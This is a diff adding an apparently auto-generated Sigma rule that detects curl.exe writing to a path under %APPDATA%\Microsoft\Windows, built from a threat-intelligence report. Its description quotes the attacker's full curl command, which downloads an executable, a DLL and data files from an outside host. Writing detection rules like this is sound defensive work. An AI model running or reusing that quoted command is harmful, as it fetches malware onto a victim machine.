@@ -1,0 +1,23 @@
+title: 'Command the source shows being run: curl.exe \Microsoft\Windows\#1'
+id: b50511af-ad01-4486-8b49-3adbf5d2f10e
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "curl.exe -k -o "%APPDATA%\Microsoft\Windows\#1" https://homepage.brianwilli.com/d/{wint.exe,calibre-launcher.dll,85rY.dat,SysPr.prx}".'
+references:
+- https://www.proofpoint.com/us/blog/threat-insight/once-bluemoon-multiple-state-aligned-threat-actors-rapidly-adopt-novel-exploit
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-06'
+tags:
+- attack.t1105
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \curl.exe
+    CommandLine|contains: \Microsoft\Windows\#1
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hunt_id: H-0639
